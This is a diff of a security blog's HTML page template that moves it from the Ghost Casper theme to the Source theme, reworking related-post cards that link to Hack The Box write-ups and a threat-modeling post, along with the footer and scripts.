-        </a>
-    </div>
-</section>
+</main>
 
 
-<aside class="read-more-wrap">
-    <div class="read-more inner">
-
-
-                    
-<article class="post-card post ">
-
-    <a class="post-card-image-link" href="../htb-write-up-horizontall/index.html">
-        <img class="post-card-image"
-            srcset="../content/images/size/w300/2025/01/Horizontall-1.png 300w,
-                   ../content/images/size/w600/2025/01/Horizontall-1.png 600w,
-                  ../content/images/size/w1000/2025/01/Horizontall-1.png 1000w,
-                 ../content/images/size/w2000/2025/01/Horizontall-1.png 2000w"
-            sizes="(max-width: 1000px) 400px, 800px"
-            src="../content/images/size/w600/2025/01/Horizontall-1.png"
-            alt="HTB Write-up | Horizontall (user-only)"
-            loading="lazy"
-        />
+            <section class="gh-container is-grid gh-outer">
+                <div class="gh-container-inner gh-inner">
+                    <h2 class="gh-container-title">Read more</h2>
+                    <div class="gh-feed">
+                            <article class="gh-card post">
+    <a class="gh-card-link" href="../htb-write-up-horizontall/index.html">
+            <figure class="gh-card-image">
+                <img
+                    srcset="../content/images/size/w160/format/webp/2025/01/Horizontall-1.png 160w,
+                           ../content/images/size/w320/format/webp/2025/01/Horizontall-1.png 320w,
+                          ../content/images/size/w600/format/webp/2025/01/Horizontall-1.png 600w,
+                         ../content/images/size/w960/format/webp/2025/01/Horizontall-1.png 960w,
+                        ../content/images/size/w1200/format/webp/2025/01/Horizontall-1.png.png 1200w,
+                       ../content/images/size/w2000/format/webp/2025/01/Horizontall-1.png1.png 2000w"
+                    sizes="320px"
+                    src="../content/images/size/w600/2025/01/Horizontall-1.png"
+                    alt="HTB Write-up | Horizontall (user-only)"
+                    loading="lazy"
+                >
+            </figure>
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">HTB Write-up | Horizontall (user-only)</h3>
+                <p class="gh-card-excerpt is-body">Write-up for Horizontall, a retired HTB Linux machine.</p>
+            <footer class="gh-card-meta">
+<!--
+             -->
+                    <span class="gh-card-author">By Inês Martins</span>
+                    <time class="gh-card-date" datetime="2025-01-03">03 Jan 2025</time>
+                <!--
+         --></footer>
+        </div>
     </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="../htb-write-up-horizontall/index.html">
-            <header class="post-card-header">
-                <h2 class="post-card-title">HTB Write-up | Horizontall (user-only)</h2>
-            </header>
-            <section class="post-card-excerpt">
-                <p>Write-up for Horizontall, a retired HTB Linux machine.</p>
-            </section>
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-                    <a href="../author/ines/index.html" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="../author/ines/index.html">Inês Martins</a></span>
-                <span class="post-card-byline-date"><time datetime="2025-01-03">Jan 3, 2025</time> <span class="bull">&bull;</span> 3 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
 </article>
-                    
-<article class="post-card post ">
+                            <article class="gh-card post">
+    <a class="gh-card-link" href="../automate-threat-modeling-with-pytm-and-github-actions/index.html">
+            <figure class="gh-card-image">
+                <img
+                    srcset="../content/images/size/w160/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 160w,
+                           ../content/images/size/w320/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 320w,
+                          ../content/images/size/w600/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 600w,
+                         ../content/images/size/w960/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 960w,
+                        ../content/images/size/w1200/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png.png 1200w,
+                       ../content/images/size/w2000/format/webp/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png1.png 2000w"
+                    sizes="320px"
+                    src="../content/images/size/w600/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png"
+                    alt="Automatic Threat Modeling with pytm and Github Actions"
+                    loading="lazy"
+                >
+            </figure>
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">Automatic Threat Modeling with pytm and Github Actions</h3>
+                    <p class="gh-card-excerpt is-body">pytm is a OWASP tool that integrates with a custom GPT to make the threat modeling process quicker and more automated.
 
-    <a class="post-card-image-link" href="../automate-threat-modeling-with-pytm-and-github-actions/index.html">
-        <img class="post-card-image"
-            srcset="../content/images/size/w300/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 300w,
-                   ../content/images/size/w600/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 600w,
-                  ../content/images/size/w1000/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 1000w,
-                 ../content/images/size/w2000/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png 2000w"
-            sizes="(max-width: 1000px) 400px, 800px"
-            src="../content/images/size/w600/2024/11/Screenshot-2024-11-14-at-12.28.19-1.png"
-            alt="Automatic Threat Modeling with pytm and Github Actions"
-            loading="lazy"
-        />
+I&#39;ve developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated</p>
+            <footer class="gh-card-meta">
+<!--
+             -->
+                    <span class="gh-card-author">By Inês Martins</span>
+                    <time class="gh-card-date" datetime="2024-11-14">14 Nov 2024</time>
+                <!--
+         --></footer>
+        </div>
     </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="../automate-threat-modeling-with-pytm-and-github-actions/index.html">
-            <header class="post-card-header">
-                <h2 class="post-card-title">Automatic Threat Modeling with pytm and Github Actions</h2>
-            </header>
-            <section class="post-card-excerpt">
-                <p>pytm is a OWASP tool that integrates with a custom GPT to make the threat modeling process quicker and more automated. I've developed a custom Github Action that, on every Pull Request event, generates or updates a Threat Model report, based on changes to the Python files generated using the</p>
-            </section>
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-                    <a href="../author/ines/index.html" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="../author/ines/index.html">Inês Martins</a></span>
-                <span class="post-card-byline-date"><time datetime="2024-11-14">Nov 14, 2024</time> <span class="bull">&bull;</span> 1 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
 </article>
-                    
-<article class="post-card post ">
-
-    <a class="post-card-image-link" href="../htb-writeup-formulax/index.html">
-        <img class="post-card-image"
-            srcset="../content/images/size/w300/2024/11/Screenshot-2024-11-13-at-13.35.35.png 300w,
-                   ../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.35.png 600w,
-                  ../content/images/size/w1000/2024/11/Screenshot-2024-11-13-at-13.35.35.png 1000w,
-                 ../content/images/size/w2000/2024/11/Screenshot-2024-11-13-at-13.35.35.png 2000w"
-            sizes="(max-width: 1000px) 400px, 800px"
-            src="../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.35.png"
-            alt="HTB Write-up | FormulaX (user-only)"
-            loading="lazy"
-        />
+                            <article class="gh-card post">
+    <a class="gh-card-link" href="../htb-writeup-formulax/index.html">
+            <figure class="gh-card-image">
+                <img
+                    srcset="../content/images/size/w160/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 160w,
+                           ../content/images/size/w320/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 320w,
+                          ../content/images/size/w600/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 600w,
+                         ../content/images/size/w960/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png 960w,
+                        ../content/images/size/w1200/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png.png 1200w,
+                       ../content/images/size/w2000/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.35.png5.png 2000w"
+                    sizes="320px"
+                    src="../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.35.png"
+                    alt="HTB Write-up | FormulaX (user-only)"
+                    loading="lazy"
+                >
+            </figure>
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">HTB Write-up | FormulaX (user-only)</h3>
+                <p class="gh-card-excerpt is-body">Write-up for FormulaX, a retired HTB Linux machine.</p>
+            <footer class="gh-card-meta">
+<!--
+             -->
+                    <span class="gh-card-author">By Inês Martins</span>
+                    <time class="gh-card-date" datetime="2024-11-13">13 Nov 2024</time>
+                <!--
+         --></footer>
+        </div>
     </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="../htb-writeup-formulax/index.html">
-            <header class="post-card-header">
-                <h2 class="post-card-title">HTB Write-up | FormulaX (user-only)</h2>
-            </header>
-            <section class="post-card-excerpt">
-                <p>Write-up for FormulaX, a retired HTB Linux machine.</p>
-            </section>
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-                    <a href="../author/ines/index.html" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="../author/ines/index.html">Inês Martins</a></span>
-                <span class="post-card-byline-date"><time datetime="2024-11-13">Nov 13, 2024</time> <span class="bull">&bull;</span> 12 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
 </article>
+                            <article class="gh-card post">
+    <a class="gh-card-link" href="../htb-writeup-blazorized/index.html">
+            <figure class="gh-card-image">
+                <img
+                    srcset="../content/images/size/w160/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png 160w,
+                           ../content/images/size/w320/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png 320w,
+                          ../content/images/size/w600/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png 600w,
+                         ../content/images/size/w960/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png 960w,
+                        ../content/images/size/w1200/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png.png 1200w,
+                       ../content/images/size/w2000/format/webp/2024/11/Screenshot-2024-11-13-at-13.35.48.png8.png 2000w"
+                    sizes="320px"
+                    src="../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.48.png"
+                    alt="HTB Write-up | Blazorized (user-only)"
+                    loading="lazy"
+                >
+            </figure>
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">HTB Write-up | Blazorized (user-only)</h3>
+                <p class="gh-card-excerpt is-body">Write-up for Blazorized, a retired HTB Windows machine.</p>
+            <footer class="gh-card-meta">
+<!--
+             -->
+                    <span class="gh-card-author">By Inês Martins</span>
+                    <time class="gh-card-date" datetime="2024-11-13">13 Nov 2024</time>
+                <!--
+         --></footer>
+        </div>
+    </a>
+</article>
+                    </div>
+                </div>
+            </section>
 
-    </div>
-</aside>
+    
+    <footer class="gh-footer gh-outer">
+    <div class="gh-footer-inner gh-inner">
 
-
-    </main>
-
-    <footer class="site-footer outer">
-        <div class="inner">
-            <section class="copyright"><a href="../index.html"></a> &copy; 2025</section>
-            <nav class="site-footer-nav">
+        <div class="gh-footer-bar">
+            <span class="gh-footer-logo is-title">
+                    
+            </span>
+            <nav class="gh-footer-menu">
                 
             </nav>
-            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+            <div class="gh-footer-copyright">
+                Powered by <a href="https://ghost.org/" target="_blank" rel="noopener">Ghost</a>
+            </div>
         </div>
-    </footer>
 
+    </div>
+</footer>    
 </div>
 
+    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="pswp__bg"></div>
 
-<script
-    src="https://code.jquery.com/jquery-3.5.1.min.js"
-    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
-    crossorigin="anonymous">
-</script>
-<script src="../assets/built/casper.js%3Fv=aa2daa7cee"></script>
-<script>
-$(document).ready(function () {
-    // Mobile Menu Trigger
-    $('.gh-burger').click(function () {
-        $('body').toggleClass('gh-head-open');
-    });
-    // FitVids - Makes video embeds responsive
-    $(".gh-content").fitVids();
-});
-</script>
+    <div class="pswp__scroll-wrap">
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="../assets/built/source.js%3Fv=e213fc6d24"></script>
 
 
 
